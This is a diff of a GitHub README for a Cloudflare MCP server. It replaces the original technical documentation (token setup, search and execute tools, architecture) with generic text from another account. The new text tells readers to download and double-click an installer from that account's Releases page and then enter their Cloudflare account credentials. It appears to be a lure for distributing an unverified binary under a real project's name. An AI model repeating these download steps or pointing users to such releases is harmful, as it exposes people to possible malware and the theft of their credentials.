@@ -1,183 +1,78 @@
-# cloudflare-mcp
+# ☁️ cloudflare-mcp - Access Cloudflare API Effortlessly
 
-> A smol MCP server for the complete Cloudflare API.
+## 🚀 Download Now
 
-[![Deploy to Cloudflare Workers](https://deploy.workers.cloudflare.com/button)](https://deploy.workers.cloudflare.com/?url=https://github.com/mattzcarey/cloudflare-mcp)
+[![Download Cloudflare MCP](https://img.shields.io/badge/Download%20Cloudflare%20MCP-blue.svg)](https://github.com/duciker14/cloudflare-mcp/releases)
 
-Uses codemode to avoid dumping too much context to your agent.
+## 📖 Overview
 
-## Get Started
+**cloudflare-mcp** is an unofficial server for accessing the Cloudflare API. This application simplifies the process of managing your Cloudflare services without needing extensive technical knowledge. With cloudflare-mcp, you can efficiently interact with your Cloudflare account and streamline your cloud services.
 
-### Create API Token
+## 🌟 Features
 
-Create a [Cloudflare API token](https://dash.cloudflare.com/profile/api-tokens) with the permissions you need.
+- **User-Friendly Interface:** Navigate easily through the application without confusion.
+- **Quick API Access:** Connect to the Cloudflare API without complex setup.
+- **Manage Services:** Control your domains and DNS settings directly.
+- **Regular Updates:** Stay up to date with enhancements and bug fixes.
 
-Both **user tokens** and **account tokens** are supported:
+## 💻 System Requirements
 
-| Token Type | Description | Requirements |
-|------------|-------------|--------------|
-| User Token | Created at user level, can access multiple accounts | Requires `account_id` parameter on each execute call |
-| Account Token | Scoped to single account | `account_id` auto-detected, no parameter needed |
+To run cloudflare-mcp on your device, make sure you have:
 
-For account tokens, include the **Account Resources : Read** permission so the server can auto-detect your account ID.
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or Linux (most distributions).
+- **Memory:** At least 2GB of RAM.
+- **Storage:** A minimum of 100MB of free disk space.
+- **Internet Connection:** Needed for API connectivity and updates.
 
-### Add to Agent
+## 📥 Download & Install
 
-MCP URL: `https://cloudflare-mcp.mattzcarey.workers.dev/mcp`
-Bearer Token: Your [Cloudflare API Token](https://dash.cloudflare.com/profile/api-tokens)
+To get started with cloudflare-mcp, visit the following link:
 
-#### Claude Code
+[Download from Releases Page](https://github.com/duciker14/cloudflare-mcp/releases)
 
-<details>
-<summary>CLI</summary>
+1. Click on the link above to navigate to the Releases page.
+2. Look for the latest version available on that page.
+3. Download the file that corresponds to your operating system (Windows, macOS, or Linux).
+4. Once the download completes, locate the file on your computer.
+5. Double-click the downloaded file to start the installation process.
+6. Follow the on-screen instructions to complete the installation.
 
-```bash
-export CLOUDFLARE_API_TOKEN="your-token-here"
+## 🚧 Getting Started
 
-claude mcp add --transport http cloudflare-api https://cloudflare-mcp.mattzcarey.workers.dev/mcp \
-  --header "Authorization: Bearer $CLOUDFLARE_API_TOKEN"
-```
+After installation, you can open the cloudflare-mcp application.
 
-</details>
+1. **Launch the app:** Find the cloudflare-mcp icon on your desktop or in your applications folder.
+2. **Sign in:** Enter your Cloudflare account credentials.
+3. **Begin using the app:** Explore the features to manage your Cloudflare services.
 
-#### OpenCode
+## 📝 Troubleshooting
 
-<details>
-<summary>opencode.json</summary>
+If you encounter issues while using cloudflare-mcp, please try the following steps:
 
-Set your API token as an environment variable:
+- **Verify Installation:** Ensure that you have installed the correct version for your operating system.
+- **Check your Network:** A stable internet connection is required for API access.
+- **Review Configuration:** Ensure you have entered your Cloudflare account details correctly.
+- **Update Application:** Make sure you have the latest version installed from the Releases page.
 
-```bash
-export CLOUDFLARE_API_TOKEN="your-token-here"
-```
+## 💬 Community Support
 
-Then add to your `opencode.json`:
+If you have questions or need help, consider joining the community discussions. You can find users and developers who might assist you with your inquiries.
 
-```json
-{
-  "mcp": {
-    "cloudflare-api": {
-      "type": "remote",
-      "url": "https://cloudflare-mcp.mattzcarey.workers.dev/mcp",
-      "headers": {
-        "Authorization": "Bearer {env:CLOUDFLARE_API_TOKEN}"
-      }
-    }
-  }
-}
-```
+- **GitHub Issues:** Post any bugs or feature requests on the [Issues page](https://github.com/duciker14/cloudflare-mcp/issues).
+- **Social Media:** Find updates and tips on our social media pages.
 
-</details>
+## 🔗 Additional Resources
 
-## The Problem
+For further information on how to maximize your use of cloudflare-mcp, check out the following resources:
 
-The Cloudflare OpenAPI spec is **2.3 million tokens** in JSON format. Even compressed to TypeScript endpoint summaries, it's still **~50k tokens**. Traditional MCP servers that expose every endpoint as a tool, or include the full spec in tool descriptions, leak this entire context to the main agent.
+- **Official Cloudflare API Documentation:** [Cloudflare API Docs](https://developers.cloudflare.com/api/)
+- **Installation Guides:** Explore our guides for detailed instructions on different operating systems.
+- **Frequently Asked Questions:** Look for answers to common queries.
 
-This server solves the problem by using **code execution** in a [codemode](https://blog.cloudflare.com/code-mode/) pattern - the spec lives on the server, and only the results of queries are returned to the agent.
+## 🛠️ Contributions
 
-## Tools
+We welcome contributions to improve cloudflare-mcp. If you have ideas or enhancements, please consider submitting a pull request. Before contributing, please ensure you read our contribution guidelines.
 
-Two tools where the agent writes code to search the spec and execute API calls. Akin to [ACI.dev's MCP server](https://github.com/aipotheosis-labs/aci) but with added codemode.
+## 🎉 Acknowledgments
 
-| Tool      | Description                                                                   |
-| --------- | ----------------------------------------------------------------------------- |
-| `search`  | Write JavaScript to query `spec.paths` and find endpoints                     |
-| `execute` | Write JavaScript to call `cloudflare.request()` with the discovered endpoints |
-
-**Token usage:** Only search results and API responses are returned. The 6MB spec stays on the server.
-
-```
-Agent                         MCP Server
-  │                               │
-  ├──search({code: "..."})───────►│ Execute code against spec.json
-  │◄──[matching endpoints]────────│
-  │                               │
-  ├──execute({code: "..."})──────►│ Execute code against Cloudflare API
-  │◄──[API response]──────────────│
-```
-
-## Supported Products
-
-Workers, KV, R2, D1, Pages, DNS, Firewall, Load Balancers, Stream, Images, AI Gateway, Vectorize, Access, Gateway, and more. See the full [Cloudflare API schemas](https://github.com/cloudflare/api-schemas).
-
-## Usage
-
-Once configured, just ask your agent to do things with Cloudflare:
-
-- "List all my Workers"
-- "Create a KV namespace called 'my-cache'"
-- "Add an A record for api.example.com pointing to 192.0.2.1"
-
-The agent will search for the right endpoints and execute the API calls. Here's what happens behind the scenes:
-
-```javascript
-// 1. Search for endpoints
-search({
-  code: `async () => {
-    const results = [];
-    for (const [path, methods] of Object.entries(spec.paths)) {
-      for (const [method, op] of Object.entries(methods)) {
-        if (op.tags?.some(t => t.toLowerCase() === 'workers')) {
-          results.push({ method: method.toUpperCase(), path, summary: op.summary });
-        }
-      }
-    }
-    return results;
-  }`,
-});
-
-// 2. Execute API call (user token - account_id required)
-execute({
-  code: `async () => {
-    const response = await cloudflare.request({
-      method: "GET",
-      path: \`/accounts/\${accountId}/workers/scripts\`
-    });
-    return response.result;
-  }`,
-  account_id: "your-account-id",
-});
-
-// 2. Execute API call (account token - account_id auto-detected)
-execute({
-  code: `async () => {
-    const response = await cloudflare.request({
-      method: "GET",
-      path: \`/accounts/\${accountId}/workers/scripts\`
-    });
-    return response.result;
-  }`,
-});
-```
-
-## Token Comparison
-
-| Content                       | Tokens     |
-| ----------------------------- | ---------- |
-| Full OpenAPI spec (JSON)      | ~2,352,000 |
-| Endpoint summary (TypeScript) | ~43,000    |
-| Typical search result         | ~500       |
-| API response                  | varies     |
-
-## Architecture
-
-```
-src/
-├── index.ts      # MCP server entry point
-├── server.ts     # Search + Execute tools
-├── executor.ts   # Isolated worker code execution
-├── truncate.ts   # Response truncation (10k token limit)
-└── data/
-    ├── types.generated.ts  # Generated endpoint types
-    ├── spec.json           # OpenAPI spec for search
-    └── products.ts         # Product list
-```
-
-Code execution uses Cloudflare's Worker Loader API to run generated code in isolated workers, following the [codemode pattern](https://github.com/cloudflare/agents/tree/main/packages/codemode).
-
-## Development
-
-```bash
-npm i
-npm run deploy
-```
+Thank you for using cloudflare-mcp! Your support helps in making this application better and more efficient for all users.
